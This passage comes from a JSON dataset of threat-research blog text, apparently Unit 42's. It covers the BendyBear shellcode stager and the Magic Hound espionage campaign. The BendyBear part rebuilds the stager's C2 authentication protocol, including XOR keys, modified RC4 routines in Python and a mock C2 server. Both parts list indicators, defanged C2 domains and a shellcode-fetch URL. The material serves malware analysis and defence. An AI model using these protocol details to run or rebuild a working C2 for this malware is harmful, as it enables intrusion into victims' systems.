                "The shellcode (SHA256: 64CC899EC85F612270FCFB120A4C80D52D78E68B05CAF1014D2FE06522F1E2D0) is considered to be a stager, or downloader, whose function is to download an implant from a C2 server.",
                "During execution, the code employs byte randomization to obscure its behavior.",
                "This is achieved by using the hosts current time as a seed for a pseudorandom number generator, and then performing additional operations against that output.",
                "The resulting values are used to overwrite blocks of previously executed code.",
                "This byte manipulation is the first anti-analysis technique observed in the code, as any attempt to dump the memory segment would result in illegitimate or incorrect operations.",
                "Figure 1 shows an example of the shellcode main entry point before and during runtime execution."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Because shellcode lacks the ability to run on its own, a Windows loader is required to allocate an environment in memory for it to execute.",
                "At the time of analysis, no loader had been identified for this shellcode; Therefore, Unit 42 created a custom loader to study the code during its runtime execution.",
                "Since then, however, several older installers were discovered with embedded WaterBear shellcode based on attributes identified from this sample.",
                "More information on these loaders can be found in the Appendix section x86 WaterBear Loaders."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The shellcode begins by locating the targets Process Environment Block (PEB) to check if its currently being debugged.",
                "However, the code is written such that it pulls both the BeingDebugged and BitField values from the PEB, resulting in code logic that invalidates the debugger check.",
                "Because of this, the shellcode will always fail to recognize when a debugger is attached.",
                "This routine is performed 52 times in a while loop."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Next, the shellcode iterates through the PEBs loader module list looking for the base address of Kernel32.dll.",
                "This is typical of shellcode, as the Kernel32.dll base address is necessary to resolve any dependency files required by the shellcode to run.",
                "With this address, the shellcode loads its dependency modules and resolves any necessary Windows Application Programming Interface (API) calls using standard shellcode API hashing.",
                "The following modules are loaded:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the shellcode initialization complete, it moves onto its main function.",
                "It begins by querying the targets registry, at the following key:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This registry key is used by the Windows command prompt to enable Quick Edit mode.",
                "Quick Edit mode allows copy and paste from the command prompt to the clipboard.",
                "By default, this key contains a REG_DWORD, a 32-bit number of either 1 for enabled or 0 for disabled.",
                "BendyBear reads this value, multiplies it by 1000 and performs the following calculation on the result:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the result is less than 1,000 or greater than 3,300,000 the shellcode configuration (QuickEdit) is 4,000 (0xFA0) otherwise it is the result of the computed value."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Refer to the highlighted light blue value in Figure 2 Shellcode configuration."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This check is performed each and every time the shellcode is executed.",
                "One explanation for the use of this key is that the value is written to by the shellcode loader (to a value other than 0 or 1) and its used by the shellcode to obtain configuration settings."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It then decrypts its internal configuration structure, which is 1,152 bytes.",
                "An example is shown in Figure 2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A breakdown of the configuration structure shown in Figure 2 is below (from top to bottom):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Before communicating with the C2 server, the shellcode flushes the hosts DNS cache by performing the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When this API is called, all domains resolved are cleared from the hosts DNS cache, not just the target C2 server.",
                "This forces the host to resolve the current IP associated with the C2 domain, ensuring that communication continues as network infrastructure becomes compromised or unavailable.",
                "It also implies the developers own the domain and can update the IP."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The stager begins by computing 10 bytes of data to send to the C2 server.",
                "These 10 bytes make up a challenge request packet.",
                "The stager sends the challenge request to the C2 and waits for a challenge response.",
                "When received and properly decrypted, the stager checks for magic values or signature bytes at specific offsets.",
                "If this check fails, the network connection is aborted.",
                "This check ensures trusted communication with the intended C2 server and initiates the download of the payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The stager computes a 10-byte challenge request containing information for the C2, to include the size of the data (being the session keys) to be received next.",
                "The challenge request and session keys are sent to the C2 simultaneously.",
                "Example request:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "26BCFCCE738A211F3763"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 decrypts the challenge request packet using the following steps:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1.",
                "First byte will be XORed with the second byte, second byte with third byteuntil byte 10, followed by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A. Byte 7 is updated from the result of ( byte 7 XORed with byte 3 ).",
                "B. Byte 2 is updated from the result of ( byte 2 XORed with byte 0 ).",
                "C. Byte 8 is updated from the result of ( byte 8 XORed with byte 0 ).",
                "D. Byte 9 is updated from the result of ( byte 9 XORed with byte 5 )."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2. Final value is XORed with key 0x3FDA5F9AD85D50C77E6A"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The challenge request decrypts to the following (represented as hex bytes):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The last four bytes of the decrypted request packet inform the C2 server of the size of the expected network traffic to follow.",
                "As shown above, the value is 0x20, or 32 bytes.",
                "These 32 bytes make up the session keys used by the C2 server to encrypt a server challenge response and encrypt the payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example of session keys received by the C2 server:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Session key 1--> 8C931D4F764B0661C26D77239EB454CA"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Session key 2--> 7A4DD0AA6C3F37CDBDAFA4CBD6B27697"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The challenge request packet and session keys are computed for each beacon and therefore would always be unique."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 uses the session keys to build the RC4 state box and as an XOR key for encryption and decryption."
            ]
        },
        {
            "type": "caption",
            "content": [
                "*It should be noted that the use of session key 2 is not yet fully understood, and it did not appear to be used to communicate with the stager."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1.",
                "The pre-session key is computed using session key 1 (first 16 bytes) as follows:\nPre-Session Key = session key 1 XOR \n0X6162636465666768696A6B6C6D6E6F00"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2.",
                "Using the computed pre-session key from step 1, the C2 server builds the RC4 Key Scheduling Algorithm (KSA).",
                "It is computed as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a. Build the RC4 KSA using the following inputs to the below function:\ndata = 16-byte key 0x0C2F65194FF37B2D63D34635C7B205E4\nkey = 16-byte computed pre-session key from step 1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example RC4 (modified)",
                "KSA routine:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "def rc4_KSA(data, key):\n   x = 0\n   box = range(258)\n   box[256] = 0\n   box[257] = 0\n   for i in range(256):\n   x = (x + box[i] + ord(key[i % len(key)])) % 256\n   box[i], box[x] = box[x], box[i]\n   return box"
            ]
        },
        {
            "type": "caption",
            "content": [
                "*Note about the input parameter \u201cdata\u201d for the KSA routine: It is the XOR result of the two 16-byte keys shown neon green in Figure 2. Shellcode Configuration Structure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3. Construct 10-byte server challenge response header using the hex values shown in Figure 5."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4. Encrypt server challenge response header from step 3:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a. XOR 10-byte server challenge with key 0x33836E6B3FAA6AC464DA and perform the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "i. Byte 7 is updated from the result of ( byte 7 XORed with byte 3 ).\nii.",
                "Byte 2 is updated from the result of ( byte 2 XORed with byte 0 ).\niii.",
                "Byte 8 is updated from the result of ( byte 8 XORed with byte 0 ).",
                "iv.",
                "Byte 9 is updated from the result of ( byte 9 XORed with byte 5 )."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b. Encrypted server challenge response header = result of 4(a)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5. Compute final authentication key:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a. XOR the following values:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "i. 0x0C2F65194FF37B2D63D34635C7B205E4\nii.",
                "Value computed from step 1, i.e. Pre-Session Key"
            ]
        },
        {
            "type": "caption",
            "content": [
                "*The 16-byte value in 5.a.i is the same input parameter used in the KSA algorithm in step 2.",
                "The stager expects this key from the C2 otherwise the session is aborted."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The values generated in steps 4 and 5 make up the complete server challenge response.",
                "At this point, the C2 sends the server challenge response to the stager, completing the authentication process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Next, the C2 prepares to send a command to the stager.",
                "BendyBear only supports one type of command: payload download."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1. Build a 10-byte command header using the hex values shown in Figure 6."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The only change to the header is the fixed signature value from 0x40 to 0x43."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2. Encrypt the command header from step 1:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following is an example of a RC4 modified routine that can be used.",
                "The first argument, box, would be the S-Box computed in step III.2 and the second argument, data, would be the command header from step 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "def rc4_Mod_Crypt(box, data):\n  x = box[256]\n  y = box[257]\n  c = 0\n  out = []\n  for char in data:\n    x = (x + 1) % 256\n    y = (y + box[x]) % 256\n    box[x], box[y] = box[y], box[x]\n    z = ( (box[x] + box[y] )&0xff ) % 256\n    al = rol( box[z],4,8 )\n    out.append( chr( ord( data[c] ) ^ al ) )\n    box[z] = al\n    c+=1\n  box[256] = x\n  box[257] = y\n  return ''.join(out)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3. Obtain the size of the payload and encrypt that value using the same RC4 algorithm as in step 2.",
                "The size of the payload should be the total decrypted size of the payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4. Encrypt and send the payload to the stager in chunks:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a. Read 4,086 bytes from the payload.",
                "This is the maximum chunk size that the stager will accept."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b. Build a command header (step 1 above) and update the following fields:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "i. Header size = size of payload chunk."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ii.",
                "Command = 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c. Send the updated 10-byte command header to the stager."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d. Send the encrypted payload chunk."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e. Repeat steps a - d until payload is sent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7 shows an example of one payload chunk that is sent to the stager."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon receiving each chunk, the stager strips the command header and decrypts the payload chunk in memory."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the payload is fully decrypted, the stager performs some basic checks to ensure that the payload conforms to a Windows executable.",
                "It validates the DOS and PE header and that the payload is a DLL.",
                "It then direct-memory loads the payload and calls into its entry point (AddressOfEntryPoint).",
                "The direct memory load of the payload emulates that of the Windows PE loader  LoadLibrary.",
                "As a result, the PEB LDR_DATA_TABLE_ENTRY metadata structures are not created and the PEB for the process running the shellcode has no record of the DLL loading, which can be used to detect rogue modules running on your host.",
                "This is visible in WinDbg running the command !address within the process that loaded the shellcode.",
                "An example is shown in Figure 8."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In-memory artifacts:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The output of the WinDbg !address command shown in Figure 8 spots the anomalous entry.",
                "The memory address of module 0x7ff4c2450000 was the result of private memory allocation, protection set to RWX and usage containing an MZ header."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following table describes the main behaviors of BendyBear."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1. x64 shellcode commands executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. Comparison of BendyBear and WaterBear."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "File Type  WaterBear is a standalone PE/EXE.",
                "BendyBear is a x64 Shellcode that requires loader or code injection."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Implant Type  WaterBear is a stage-2 implant with many capabilities; BendyBear is a stage-0 downloader."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Modified RC4 Encryption  Both WaterBear and BendyBear use a modified RC4, but implement them slightly differently.",
                "WaterBear uses a 256 RC4 state box with byte shifting and addition within the key scheduling algorithm.",
                "BendyBear uses a 258 RC4 state box and performs XOR within the key scheduling algorithm."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additional Encryption  While both use encryption as a way to conceal artifacts, BendyBear was found to contain additional XOR encryption steps."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "16-Byte XOR Key  Both use the same 16-byte XOR key to create the pre-session key: 0x6162636465666768696A6B6C6D6E6f00"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Authenticated C2 Communications  Both send an initial 10-byte challenge request followed by 32-byte session keys."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Signature Verification Magic Bytes  Both use the same matching magic byte verification values."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Chunked Payload  Both expect the payloads to be sent in encrypted chunks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Polymorphic Code  Both employ code manipulation during runtime execution with random bytes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In-Memory Loading  Both support the in-memory loading of payloads."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PEB Debugger Check  Both check to see if the code is being debugged."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pattern Elimination Both re-encrypt any decrypted strings upon use."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Encrypt/Decrypt Function Routines  Both WaterBear and BendyBear obfuscate runtime function addresses."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "API Hooking  Variants of WaterBear implement API hooking, while BendyBear does not."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Process Hiding  Variants of WaterBear can hide processes via API hooking, while BendyBear does not support this capability."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Network Traffic Filtering  Variants of WaterBear can filter or hide network traffic via API hooking, while BendyBear does not support this capability."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The BendyBear shellcode contains advanced features that are not typically found in shellcode.",
                "The use of anti-analysis techniques and signature block verification indicate that the developers care about stealth and detection-evasion.",
                "Additionally, the use of custom cryptographic routines and byte manipulations suggest a high level of technical sophistication."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers can be protected from the attacks outlined in this blog in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "x64 - (version 0.24)\n64CC899EC85F612270FCFB120A4C80D52D78E68B05CAF1014D2FE06522F1E2D0 wg1.inkeslive[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "x86 - (version 0.1)\n49901034216a16cfd05c613f438eccee4a7bf6079a7988b3e7094d9498379558 web2008.rutentw[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following executables have been identified as loaders/injectors that contain older WaterBear x86 shellcode.",
                "The shellcode code is identical to the x86 sample 49901034216....",
                "(version 0.1) listed above."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5d1414b47d88e95ae6612d3fc211c29b35cc5db4a8a992f5e27cff5203ebf44b\n9880ba4f93cade2f6bbb4cc8efdcf087e8ac51b5c209ee32ad8134eb87ef70e1\n682122f34027e3f8025928d446989b02952449f5e5930c2670f8f789f41573ff\n2a09ec2d6edadd06e18c841e0ed794ba3eeb21818476f75ccc0e5d40e08eac80\n76ef704d21fbaaceca8a131429ccfb9f5de3d8f43a160ddd281ffeafc391eb98"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Taiwan News  Taiwan urges blocking 11 China-linked phishing domains.",
                "iThome News  The Bureau of Investigations recent investigation of several cases of Taiwan Government agencies hacked.",
                "TeamT5  Evil Hidden in Shellcode: The Evolution of malware DbgPrint.",
                "TrendMicro  WaterBear Returns, Uses API Hooking to Evade Security.",
                "TrendMicro  The Trail of BlackTechs Cyber Espionage Campaigns.",
                "CryCraft Technology Corp - Taiwan Government Targeted by Multiple Cyberattacks in April 2020 Part 1: Waterbear Malware\nJPCERT/CC Eyes - ELF_PLEAD - Linux Malware Used by BlackTech"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Mock C2 server serving request to stager and sending a payload (DLL) that displays a message box:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9. Unit 42 mock C2 server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9 is a Python mock C2 server that was created by Unit 42 to interact with the stager.",
                "It is configured to listen on TCP port 8080, and the payload is a test DLL that launches calc.exe and displays a message box (Hello, Implant).",
                "Figure 10 is a Windows 10 host running the shellcode in memory via a custom loader.",
                "The shellcode was configured to communicate with the mock C2 server."
            ]
        }
    ],
    "efd134dff6b1c73acc3fab915de7a890a6b15a4d": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has discovered a persistent attack campaign operating primarily in the Middle East dating back to at least mid-2016 which we have named Magic Hound.",
                "This appears to be an attack campaign focused on espionage.",
                "Based upon our visibility it has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.",
                "The adversaries appear to have evolved their tactics and techniques throughout the tracked time-period, iterating through a diverse toolset across different waves of attacks.",
                "Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called Rocket Kitten (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters.",
                "Artifacts of this campaign was also recently published by Secureworks CTU."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were able to collect over fifty samples of the tools used by the Magic Hound campaign using the AutoFocus threat intelligence tool.",
                "The earliest malware sample we were able to collect had a compile timestamp in May 2016.",
                "The samples themselves ranged from IRC bots, an open source Python remote access tool, malicious macros, and others.",
                "It is believed the use of specific tools may have coincided with specific attack waves by this adversary, with the most recent attacks using weaponized Microsoft Office documents with malicious macros.",
                "Due to the large amount of data collected, and limitations on attack telemetry, this blog will focus primarily on the most recent attacks occurring in the latter half of 2016."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The samples initially collected and associated with Magic Hound were Microsoft Word and Excel documents containing embedded malicious macros.",
                "We were able to expand our data set by pivoting on infrastructure and tool behavior, which uncovered additional types of tools in use by Magic Hound, such as regular portable executable (PE) payloads, PE files compiled in .NET Framework, various forms of IRC bots, and an open source file-less Python remote access tool called Pupy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The weaponized Office documents were found to be hosted either on what appeared to be compromised legitimate websites, or on websites using domain names similar to legitimate domain names in appearance.",
                "The two legitimate websites we were able to identify were owned by organizations in the government and energy sectors.",
                "Based on the existence of these malicious files on the legitimate websites, it is highly probable that the websites had already been compromised in some fashion.",
                "At the time of investigation, the files had already been removed from the websites.",
                "The two other delivery sites were ntg-sa[.]com, which may be trying to spoof a Saudi based information and communication technology conglomerate and mol.com-ho[.]me, which may be trying to spoof the Ministry of Labor.",
                "A third delivery site was identified at its.com-ho[.]me which may appear to be a benign domain."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Several of these documents were also found on a seemingly unrelated, but benign-looking domain, briefl[.]ink."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism.",
                "We were ultimately able to identify multiple organizations in the government, energy, and technology sectors targeted by Magic Hound."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The weaponized documents themselves all contained malicious macros which were designed to call Windows PowerShell to retrieve additional tools.",
                "A handful of lures with different themes were used repeatedly with variations throughout the eighteen collected documents.",
                "They ranged from documents masquerading as official Saudi government forms to a holiday greetings card.",
                "The forms masquerading as official government documents specifically used imagery from the Ministry of Health and the Ministry of Commerce claiming to be mandatory forms that required macros to be enabled.",
                "Examples of the documents can be seen below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Analysis of the weaponized documents revealed some peculiarities right away.",
                "The majority of documents used the name gerry knight for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names.",
                "These C2 servers also appeared to lack any relationships to each other and were hosted on a variety of VPS providers.",
                "Two of the Word documents using the gerry knight author name however were found to be communicating to C2 servers on two specific domains, www1.chrome-up[.]date and www3.chrome-up[.]date.",
                "Using these domains as pivot points, we were able to expand our data set.",
                "As seen below, the relational analysis proved to be quite fruitful:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Overview of relationships"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We rapidly discovered a different set of tools communicating to the exact same C2 servers as those two Word documents, in addition to other tools communicating to other subdomain variations of chrome-up[.]date as seen in the following graphic:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Command and control overlaps"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "From there, we were able to map out a large infrastructure separating out into four categories of tools: downloaders, droppers, loaders, and payloads.",
                "What initially appeared as a disparate and segregated attack campaign appeared very rapidly to be a persistent and prolonged attack campaign with very specific goals in mind."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In total, we were able to collect over fifty different samples via infrastructure reuse, behavioral matching, and the reuse of a specific file for maintaining persistence.",
                "These tools included Microsoft Office documents, portable executables (PE), .NET Framework PE files, Meterpreter, IRC bots, an open sourced Meterpreter module called Magic Unicorn, and an open sourced Python RAT called Pupy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Interestingly as we continued to expand and pivot in our data set, one of the C2 IPs used by an IRC bot payload from Magic Hound was found to be the same IP used to deliver a different IRC bot called MPK."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Rocket Kitten and Magic Hound infrastructure overlap"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The MPK bot is not publicly available and had previously been attributed to an adversary group called Rocket Kitten which has often been thought to be a state sponsored adversary operating in the Middle East region.",
                "Although the likelihood of two different adversaries focused on espionage operating in the same geographical region using one specific IP and not being related somehow is fairly slim, due to limited telemetry, we lack additional corroborating evidence of a conclusive relationship."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros.",
                "During our analysis, we were able to determine the ultimate payload for several of these attacks.",
                "One payload was a Python based open source remote administration tool (RAT) called Pupy.",
                "A second payload was an IRC bot we have named MagicHound.Leash.",
                "We have also seen this group use the Magic Unicorn module to generate a PowerShell script to deliver a shellcode-based payload.",
                "While we have not been able to obtain a secondary payload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliver Metasploit's Meterpreter as a potential payload as well."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have categorized the custom tools in use by the Magic Hound campaign into five categories, with corresponding names in Table 1.",
                "Additional details for these tools may be found in the appendix."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1\u00a0 Types of MagicHound tools and their Corresponding Names"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound campaign used Word and Excel documents containing malicious macros as a delivery method, specifically attempting to load either the Pupy RAT or meterpreter which we have called MagicHound.Rollover.",
                "The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server.",
                "We discovered two different techniques used in the PowerShell scripts, the first being a straightforward execute command of a string retrieved from the remote server.",
                "The second technique appeared to be from a tool called Magic Unicorn, an open source module for meterpreter.",
                "Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment one line shellcode injection with native x86 shellcode."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to loading payloads using macros within delivery documents, we observed the Magic Hound campaign using executables to load secondary payloads from a remote server.",
                "Both a custom developed loader, which we have named MagicHound.Fetch, as well as the default loader that comes with Pupy were found to be in use.",
                "The Fetch loader allowed us to use attributes within the loader to uncover more tools used by this group, which included a backdoor and an IRC bot."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Fetch first attempts to create persistent access to the targeted host then retrieve a secondary payload from a remote server.",
                "To set up persistence, the loader writes a file to \"c:\\temp\\rr.exe\" and executes it with specific command line arguments to create auto run registry keys.",
                "All Fetch samples drop the same exact executable to set up persistence."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES.",
                "However, they all used the same key \"agkrhfpdbvhdhrkj\".",
                "The loader's main goal was to run a PowerShell command to execute shellcode.",
                "We found the PowerShell command used by Fetch within the source code of Magic Unicorn, which was also used in the Magic Hound delivery documents.",
                "The shellcode executed by this PowerShell is the exact same as in the delivery documents, using code from Metasploit which can obtain additional shellcode to execute using an HTTP request to the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://www7.chrome-up[.]date/0m5EE"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were not able to retrieve the shellcode hosted at this URL.",
                "However, as alluded to above, we believe that this adversary used the open source Magic Unicorn tool to load a shellcode-based payload which is likely to be meterpreter."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of platforms such as Windows, macOS, Linux and Android.",
                "We have seen the Magic Hound campaign use both the 32-bit and 64-bit DLL loaders that come with Pupy to infect Windows systems.",
                "Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses.",
                "Also, the configurations show the use of the obfs3 (The Threebfuscator) transport, which is an obfuscation method to hide the true TCP-based communications protocol.",
                "The obfs3 is used in the Tor project and the specifics of this transport can be found at the Tor Project."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound campaign was also discovered using a custom dropper tool, which we have named MagicHound.DropIt.",
                "The DropIt Trojan we analyzed is an executable that builds another executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order.",
                "In all of the DropIt samples we collected, the dropper then saves the executable to the users %TEMP% folder and executes the file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have also seen Magic Hound using DropIt as a binder, specifically dropping a legitimate decoy executable along with the malicious executable onto the target host.",
                "The legitimate decoy executable and the malicious executable are then both executed, but with the malicious file running in the background and the decoy presented to the user.",
                "These types of tactics are generally used for evasion and to not trigger and suspicion from the victim.",
                "In one example, the decoy executable was a legitimate Flash installer, therefore from the victims perspective, they would experience the expected behavior of a Flash installer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We observed a DropIt sample installing another Trojan we call MagicHound.Retriever.",
                "At a high level, Retriever is a .NET downloader that retrieves secondary payloads using an embedded URL in its configuration as the C2.",
                "Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Retriever HTTP request sent to its C2 server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash.",
                "We discovered this connection when we observed a DropIt sample installing a backdoor Trojan that used IRC for its C2 communications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Leash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also be connected to the IRC server.",
                "All of its available commands (see Appendix), except for the VER command seen in Figure 5, must be issued by individuals in the IRC channel with nicknames that start with \"AS_\" or \"AF_\"."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Lecash bot responding to VER command"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There are a great deal of similarities between the IRC bot originally discussed in iSight's NEWSCASTER whitepaper and LEASH.",
                "iSight's whitepaper provided details on an IRC bot, which some refer to as Parastoo based on the password used to join the IRC channel, as seen in the following network traffic generated when attempting to connect to the C2:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Performing a binary diff revealed a 67% similarity between the Leash and Parastoo samples.",
                "In addition to sharing significant portions of code, both of the IRC bots require an IRC user's nickname to start with either \"AF_\" or \"AS_\" to run commands on the system.",
                "Also, the two bots have similar responses to \"VER\" commands seen in Figure 6 below, which differ slightly from the responses seen generated by Leash."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Parastoo Trojan responding to commands in similar manner to Leash"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also found a second IRC bot called MPK using the same IP for its C2 server that a Leash sample was hosted on.",
                "This MPK IRC bot is very similar to the MPK Trojan that used a custom C2 communications protocol, as detailed in a whitepaper by CheckPoint regarding a threat group called Rocket Kitten.",
                "We believe this version of the MPK Trojan is based on the same code base, as both the IRC version and the one referenced in the white paper have considerable similarities from a behavior standpoint as well as direct code overlap."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound attack campaign is an active and persistent espionage motivated adversary operating in the Middle East region.",
                "Organizations in the government, energy, and technology sectors have been targeted by this adversary, specifically organizations based in or doing business in Saudi Arabia.",
                "The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public.",
                "None of the tools we uncovered were found to be exploit-driven, and relied exclusively on social engineering tactics to compromise targets.",
                "While we did discover a potential relationship with the Rocket Kitten adversary group, we cannot confirm the extent of that relationship at this time, although we will continue to monitor the activities of Magic Hound."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected via the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.DropIt SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
